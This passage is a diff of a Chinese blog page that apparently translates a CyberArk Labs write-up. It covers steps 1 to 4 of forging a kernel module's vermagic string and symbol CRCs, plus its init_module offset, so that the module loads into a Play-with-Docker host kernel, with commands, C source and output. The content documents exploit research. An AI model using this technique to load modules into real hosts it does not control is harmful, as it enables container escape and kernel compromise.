+</li>
+<li><p>H(“int”, crc2) - &gt;crc3</p>
+</li>
+<li><p>crc3 ^ 0xfffffff -&gt; 结果</p>
+</li>
+</ol>
 <p>为什么说是偏序呢？因此保持从左右到的计算结构，它的计算结构可以表示成：</p>
 <p>0xffffffff -&gt; “unsigned” -&gt; 空白 -&gt; “int” -&gt; 0xffffffff</p>
 <p>为了减少阅读的噪音，去掉空白、引号和0xffffffff，将这个表达结果简成下面这样：</p>
 <p>unsigned -&gt; int</p>
 <p>如 struct foo {</p>
-<pre><code>int a;
-
-int b;
-</code></pre><p>};</p>
+<p>                   int a;</p>
+<p>                   int b;</p>
+<p>};</p>
 <p>它的crc计算方式很简单，它的计算结构为：</p>
-<p>struct -&gt; foo -&gt; {  -&gt; int -&gt; a -&gt; ; -&gt; int -&gt; b -&gt; ; -&gt; }</p>
+<p>struct -&gt; foo -&gt; {  -&gt; int -&gt; a -&gt; ; -&gt; int -&gt; b -&gt; ; -&gt; }</p>
 <p>所以：</p>
 <ul>
 <li>语法属性：任保一个类型名，或者变量名发生变化，都会造成最终的CRC发生变化</li>
@@ -551,903 +384,167 @@ int b;
 </blockquote>
 <h3 id="Step-1-Find-the-call-usermodehelper-CRC-Address-on-the-Target-Kernel"><a href="#Step-1-Find-the-call-usermodehelper-CRC-Address-on-the-Target-Kernel" class="headerlink" title="Step 1 - Find the call_usermodehelper CRC Address on the Target Kernel"></a>Step 1 - Find the call_usermodehelper CRC Address on the Target Kernel</h3><p>通过/proc/kallsyms获取符号地址：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[node1] $ cat /proc/kallsyms | grep call_usermod</span><br><span class="line">ffffffff81096840 T call_usermodehelper_exec</span><br><span class="line">ffffffff810969f0 t call_usermodehelper_exec_async</span><br><span class="line">ffffffff81096b40 t call_usermodehelper_exec_work</span><br><span class="line">ffffffff810970a0 T call_usermodehelper_setup</span><br><span class="line">ffffffff81097140 T call_usermodehelper</span><br><span class="line">ffffffff81d8a390 R __ksymtab_call_usermodehelper</span><br><span class="line">ffffffff81d8a3a0 R __ksymtab_call_usermodehelper_exec</span><br><span class="line">ffffffff81d8a3b0 R __ksymtab_call_usermodehelper_setup</span><br><span class="line">ffffffff81daa0e0 r __kcrctab_call_usermodehelper</span><br><span class="line">ffffffff81daa0e8 r __kcrctab_call_usermodehelper_exec</span><br><span class="line">ffffffff81daa0f0 r __kcrctab_call_usermodehelper_setup</span><br><span class="line">ffffffff81dbabf1 r __kstrtab_call_usermodehelper</span><br><span class="line">ffffffff81dbac05 r __kstrtab_call_usermodehelper_exec</span><br><span class="line">ffffffff81dbac1e r __kstrtab_call_usermodehelper_setup</span><br></pre></td></tr></table></figure>
-<p><strong>call_usermodehelper()</strong>函数的CRC保存在0xffffffff81daa0e0，所以我们的探针模块需要获取该处的内容：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt; /* Needed by all modules */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt; /* Needed for KERN_INFO */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt; /* Needed for the macros */</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">"CyberArk Labs"</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">"A simple probing LKM!"</span>);</span><br><span class="line">MODULE_VERSION(<span class="string">"0.3"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __<span class="function">init <span class="title">startprobing</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// these address were copied from the kallsyms of the 4.0.0-96-generic</span></span><br><span class="line"><span class="comment">// after grepping for kcrctab_&lt;function_name&gt;</span></span><br><span class="line">  <span class="keyword">int</span> *crc1 = (<span class="keyword">int</span> *)<span class="number">0xffffffff81daa0e0</span>; <span class="comment">// address of crc of call_usermodehelper</span></span><br><span class="line">  <span class="keyword">int</span> *crc2 = (<span class="keyword">int</span> *)<span class="number">0xffffffff81dae898</span>; <span class="comment">// address of crc of printk</span></span><br><span class="line"></span><br><span class="line">  printk(KERN_EMERG <span class="string">"Loading probing module...\n"</span>);</span><br><span class="line">  printk(KERN_EMERG <span class="string">"CRC of call_UserModeHelper = 0x%x\n"</span>, *crc1);</span><br><span class="line">  printk(KERN_EMERG <span class="string">"CRC of printk = 0x%x\n"</span>, *crc2);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __<span class="function"><span class="built_in">exit</span> <span class="title">startprobing_end</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(KERN_EMERG <span class="string">"Goodbye!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(startprobing);</span><br><span class="line">module_exit(startprobing_end);</span><br></pre></td></tr></table></figure>
+
+<p>**call_usermodehelper()**函数的CRC保存在0xffffffff81daa0e0，所以我们的探针模块需要获取该处的内容：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt; /* Needed by all modules */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt; /* Needed for KERN_INFO */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt; /* Needed for the macros */</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;CyberArk Labs&quot;</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;A simple probing LKM!&quot;</span>);</span><br><span class="line">MODULE_VERSION(<span class="string">&quot;0.3&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">startprobing</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// these address were copied from the kallsyms of the 4.0.0-96-generic</span></span><br><span class="line"><span class="comment">// after grepping for kcrctab_&lt;function_name&gt;</span></span><br><span class="line">  <span class="keyword">int</span> *crc1 = (<span class="keyword">int</span> *)<span class="number">0xffffffff81daa0e0</span>; <span class="comment">// address of crc of call_usermodehelper</span></span><br><span class="line">  <span class="keyword">int</span> *crc2 = (<span class="keyword">int</span> *)<span class="number">0xffffffff81dae898</span>; <span class="comment">// address of crc of printk</span></span><br><span class="line"></span><br><span class="line">  printk(KERN_EMERG <span class="string">&quot;Loading probing module...\n&quot;</span>);</span><br><span class="line">  printk(KERN_EMERG <span class="string">&quot;CRC of call_UserModeHelper = 0x%x\n&quot;</span>, *crc1);</span><br><span class="line">  printk(KERN_EMERG <span class="string">&quot;CRC of printk = 0x%x\n&quot;</span>, *crc2);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">startprobing_end</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(KERN_EMERG <span class="string">&quot;Goodbye!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(startprobing);</span><br><span class="line">module_exit(startprobing_end);</span><br></pre></td></tr></table></figure>
+
 <h3 id="Step-2-Prepare-a-Makefile"><a href="#Step-2-Prepare-a-Makefile" class="headerlink" title="Step 2 - Prepare a Makefile"></a>Step 2 - Prepare a Makefile</h3><p>准备Makefile：</p>
 <figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">obj-m = probing.o</span><br><span class="line"><span class="section">all:</span></span><br><span class="line">make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build/ M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> clean</span><br></pre></td></tr></table></figure>
+
 <p>执行make：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ make</span><br><span class="line">make -C /lib/modules/4.17.0-rc2/build/ M=/root/cprojects/kernelmod/simplemod modules</span><br><span class="line">make[1]: Entering directory <span class="string">'/root/debian/linux-4.17-rc2'</span></span><br><span class="line">CC [M] /root/cprojects/kernelmod/simplemod/probing.o</span><br><span class="line">Building modules, stage 2.</span><br><span class="line">MODPOST 1 modules</span><br><span class="line"><span class="built_in">read</span> <span class="built_in">continue</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ make</span><br><span class="line">make -C /lib/modules/4.17.0-rc2/build/ M=/root/cprojects/kernelmod/simplemod modules</span><br><span class="line">make[1]: Entering directory <span class="string">&#x27;/root/debian/linux-4.17-rc2&#x27;</span></span><br><span class="line">CC [M] /root/cprojects/kernelmod/simplemod/probing.o</span><br><span class="line">Building modules, stage 2.</span><br><span class="line">MODPOST 1 modules</span><br><span class="line"><span class="built_in">read</span> <span class="built_in">continue</span></span><br></pre></td></tr></table></figure>
+
 <p>在编译器生成的文件probing.mod.c之后以及将其与探测模块的代码链接之前，我们停止了编译过程。这是自动生成的文件：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">$ cat probing.mod.c</span><br><span class="line"><span class="comment">#include &lt;linux/module.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/vermagic.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/compiler.h&gt;</span></span><br><span class="line"></span><br><span class="line">MODULE_INFO(vermagic, VERMAGIC_STRING);</span><br><span class="line">MODULE_INFO(name, KBUILD_MODNAME);</span><br><span class="line"></span><br><span class="line">__visible struct module __this_module</span><br><span class="line">__attribute__((section(<span class="string">".gnu.linkonce.this_module"</span>))) = &#123;</span><br><span class="line">.name = KBUILD_MODNAME,</span><br><span class="line">.init = init_module,</span><br><span class="line"><span class="comment">#ifdef CONFIG_MODULE_UNLOAD</span></span><br><span class="line">.<span class="built_in">exit</span> = cleanup_module,</span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line">.arch = MODULE_ARCH_INIT,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">#ifdef RETPOLINE</span></span><br><span class="line">MODULE_INFO(retpoline, <span class="string">"Y"</span>);</span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line"></span><br><span class="line">static const struct modversion_info ____versions[]</span><br><span class="line">__used</span><br><span class="line">__attribute__((section(<span class="string">"__versions"</span>))) = &#123;</span><br><span class="line">&#123; 0x6cb06770, __VMLINUX_SYMBOL_STR(module_layout) &#125;,</span><br><span class="line">&#123; 0x27e1a049, __VMLINUX_SYMBOL_STR(printk) &#125;,</span><br><span class="line">&#123; 0xbdfb6dbb, __VMLINUX_SYMBOL_STR(__fentry__) &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">static const char __module_depends[]</span><br><span class="line">__used</span><br><span class="line">__attribute__((section(<span class="string">".modinfo"</span>))) =</span><br><span class="line"><span class="string">"depends="</span>;</span><br><span class="line"></span><br><span class="line">MODULE_INFO(srcversion, <span class="string">"9757E367BD555B3C0F8A145"</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">$ cat probing.mod.c</span><br><span class="line"><span class="comment">#include &lt;linux/module.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/vermagic.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/compiler.h&gt;</span></span><br><span class="line"></span><br><span class="line">MODULE_INFO(vermagic, VERMAGIC_STRING);</span><br><span class="line">MODULE_INFO(name, KBUILD_MODNAME);</span><br><span class="line"></span><br><span class="line">__visible struct module __this_module</span><br><span class="line">__attribute__((section(<span class="string">&quot;.gnu.linkonce.this_module&quot;</span>))) = &#123;</span><br><span class="line">.name = KBUILD_MODNAME,</span><br><span class="line">.init = init_module,</span><br><span class="line"><span class="comment">#ifdef CONFIG_MODULE_UNLOAD</span></span><br><span class="line">.<span class="built_in">exit</span> = cleanup_module,</span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line">.arch = MODULE_ARCH_INIT,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">#ifdef RETPOLINE</span></span><br><span class="line">MODULE_INFO(retpoline, <span class="string">&quot;Y&quot;</span>);</span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line"></span><br><span class="line">static const struct modversion_info ____versions[]</span><br><span class="line">__used</span><br><span class="line">__attribute__((section(<span class="string">&quot;__versions&quot;</span>))) = &#123;</span><br><span class="line">&#123; 0x6cb06770, __VMLINUX_SYMBOL_STR(module_layout) &#125;,</span><br><span class="line">&#123; 0x27e1a049, __VMLINUX_SYMBOL_STR(printk) &#125;,</span><br><span class="line">&#123; 0xbdfb6dbb, __VMLINUX_SYMBOL_STR(__fentry__) &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">static const char __module_depends[]</span><br><span class="line">__used</span><br><span class="line">__attribute__((section(<span class="string">&quot;.modinfo&quot;</span>))) =</span><br><span class="line"><span class="string">&quot;depends=&quot;</span>;</span><br><span class="line"></span><br><span class="line">MODULE_INFO(srcversion, <span class="string">&quot;9757E367BD555B3C0F8A145&quot;</span>);</span><br></pre></td></tr></table></figure>
+
 <h3 id="Step-3-Edit-Fields-to-Match-the-Target-Kernel"><a href="#Step-3-Edit-Fields-to-Match-the-Target-Kernel" class="headerlink" title="Step 3 - Edit Fields to Match the Target Kernel"></a>Step 3 - Edit Fields to Match the Target Kernel</h3><p>我们需要替换vermagic（行6）和CRC（行26-28）来匹配目标内核，通过PWD的ceph.ko模块可以完成这个工作。我们通过modinfo从keph.ko提取内核版本和函数CRC：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ modinfo ceph.ko</span><br><span class="line"></span><br><span class="line">filename: /root/cprojects/kernelmod/play-docker/ceph.ko</span><br><span class="line">license: GPL</span><br><span class="line">description: Ceph filesystem <span class="keyword">for</span> Linux</span><br><span class="line">author: Patience Warnick &lt;patience@newdream.net&gt;</span><br><span class="line">author: Yehuda Sadeh &lt;yehuda@hq.newdream.net&gt;</span><br><span class="line">author: Sage Weil &lt;sage@newdream.net&gt;</span><br><span class="line"><span class="built_in">alias</span>: fs-ceph</span><br><span class="line">srcversion: C985B22FADB19E9D06914CC</span><br><span class="line">depends: libceph,fscache</span><br><span class="line">intree: Y</span><br><span class="line">vermagic: 4.4.0-96-generic SMP mod_unload modversions</span><br><span class="line">signat: PKCS<span class="comment">#7</span></span><br><span class="line">signer:</span><br><span class="line">sig_key:</span><br><span class="line">sig_hashalgo: md4</span><br></pre></td></tr></table></figure>
+
 <p>抄下vermagic字符串，注意它有一个尾随的空格也应复制。我们生成的头文件需要三个CRC：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">module_layout, printk 和 __fentry__</span><br></pre></td></tr></table></figure>
+
 <p>通过modprobe可以获取：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># modprobe --dump-modversions ceph.ko | grep printk</span></span><br><span class="line">0x27e1a049 printk</span><br><span class="line"><span class="comment"># modprobe --dump-modversions ceph.ko | grep module_layout</span></span><br><span class="line">0xfc5ded98 module_layout</span><br><span class="line"><span class="comment"># modprobe --dump-modversions ceph.ko | grep __fentry</span></span><br><span class="line">0xbdfb6dbb __fentry__</span><br></pre></td></tr></table></figure>
+
 <p>编辑probing.mod.c，修改vermagic和CRC：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/vermagic.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/compiler.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_INFO(vermagic, <span class="string">"4.4.0-96-generic SMP mod_unload modversions "</span>);</span><br><span class="line">MODULE_INFO(name, KBUILD_MODNAME);</span><br><span class="line"></span><br><span class="line">__visible <span class="class"><span class="keyword">struct</span> <span class="title">module</span> __<span class="title">this_module</span></span></span><br><span class="line"><span class="class">__<span class="title">attribute__</span>((<span class="title">section</span>(".<span class="title">gnu</span>.<span class="title">linkonce</span>.<span class="title">this_module</span>"))) = &#123;</span></span><br><span class="line">.name = KBUILD_MODNAME,</span><br><span class="line">.init = init_module,</span><br><span class="line">#ifdef CONFIG_MODULE_UNLOAD</span><br><span class="line">.<span class="built_in">exit</span> = cleanup_module,</span><br><span class="line">#endif</span><br><span class="line">.arch = MODULE_ARCH_INIT,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RETPOLINE</span></span><br><span class="line">MODULE_INFO(retpoline, <span class="string">"Y"</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">modversion_info</span> ____<span class="title">versions</span>[]</span></span><br><span class="line"><span class="class">__<span class="title">used</span></span></span><br><span class="line"><span class="class">__<span class="title">attribute__</span>((<span class="title">section</span>("__<span class="title">versions</span>"))) = &#123;</span></span><br><span class="line">&#123; <span class="comment">/*0x6cb06770*/</span> <span class="number">0xfc5ded98</span>, __VMLINUX_SYMBOL_STR(module_layout) &#125;,</span><br><span class="line">&#123; <span class="number">0x27e1a049</span>, __VMLINUX_SYMBOL_STR(printk) &#125;,</span><br><span class="line">&#123; <span class="number">0xbdfb6dbb</span>, __VMLINUX_SYMBOL_STR(__fentry__) &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> __module_depends[]</span><br><span class="line">__used</span><br><span class="line">__attribute__((section(<span class="string">".modinfo"</span>))) =</span><br><span class="line"><span class="string">"depends="</span>;</span><br><span class="line"></span><br><span class="line">MODULE_INFO(srcversion, <span class="string">"9757E367BD555B3C0F8A145"</span>);</span><br></pre></td></tr></table></figure>
-<p>注意到printk和<strong>fentry</strong>的CRC不变，意味着远程和本地一致。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/vermagic.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/compiler.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_INFO(vermagic, <span class="string">&quot;4.4.0-96-generic SMP mod_unload modversions &quot;</span>);</span><br><span class="line">MODULE_INFO(name, KBUILD_MODNAME);</span><br><span class="line"></span><br><span class="line">__visible <span class="class"><span class="keyword">struct</span> <span class="title">module</span> __<span class="title">this_module</span></span></span><br><span class="line"><span class="class">__<span class="title">attribute__</span>((<span class="title">section</span>(&quot;.<span class="title">gnu</span>.<span class="title">linkonce</span>.<span class="title">this_module</span>&quot;))) = &#123;</span></span><br><span class="line">.name = KBUILD_MODNAME,</span><br><span class="line">.init = init_module,</span><br><span class="line">#ifdef CONFIG_MODULE_UNLOAD</span><br><span class="line">.<span class="built_in">exit</span> = cleanup_module,</span><br><span class="line">#endif</span><br><span class="line">.arch = MODULE_ARCH_INIT,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RETPOLINE</span></span><br><span class="line">MODULE_INFO(retpoline, <span class="string">&quot;Y&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">modversion_info</span> ____<span class="title">versions</span>[]</span></span><br><span class="line"><span class="class">__<span class="title">used</span></span></span><br><span class="line"><span class="class">__<span class="title">attribute__</span>((<span class="title">section</span>(&quot;__<span class="title">versions</span>&quot;))) = &#123;</span></span><br><span class="line">&#123; <span class="comment">/*0x6cb06770*/</span> <span class="number">0xfc5ded98</span>, __VMLINUX_SYMBOL_STR(module_layout) &#125;,</span><br><span class="line">&#123; <span class="number">0x27e1a049</span>, __VMLINUX_SYMBOL_STR(printk) &#125;,</span><br><span class="line">&#123; <span class="number">0xbdfb6dbb</span>, __VMLINUX_SYMBOL_STR(__fentry__) &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> __module_depends[]</span><br><span class="line">__used</span><br><span class="line">__attribute__((section(<span class="string">&quot;.modinfo&quot;</span>))) =</span><br><span class="line"><span class="string">&quot;depends=&quot;</span>;</span><br><span class="line"></span><br><span class="line">MODULE_INFO(srcversion, <span class="string">&quot;9757E367BD555B3C0F8A145&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>注意到printk和__fentry__的CRC不变，意味着远程和本地一致。</p>
 <h3 id="Step-4-Change-init-module-Offset"><a href="#Step-4-Change-init-module-Offset" class="headerlink" title="Step 4 - Change init_module Offset"></a>Step 4 - Change init_module Offset</h3><p>加载探测模块之前的最后一步是更改其init_module可重定位偏移量，检查PWD内核ceph.ko模块的ELF结构init_module偏移量：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -a ceph.ko | less</span><br><span class="line">...</span><br><span class="line">Relocation section <span class="string">'.rela.gnu.linkonce.this_module'</span> at offset 0x8f580 contains 2 entries:</span><br><span class="line">Offset Info Type Sym. Value Sym. Name + Addend</span><br><span class="line">000000000180 052900000001 R_X86_64_64 0000000000000000 init_module + 0</span><br><span class="line">000000000338 04e700000001 R_X86_64_64 0000000000000000 cleanup_module + 0</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
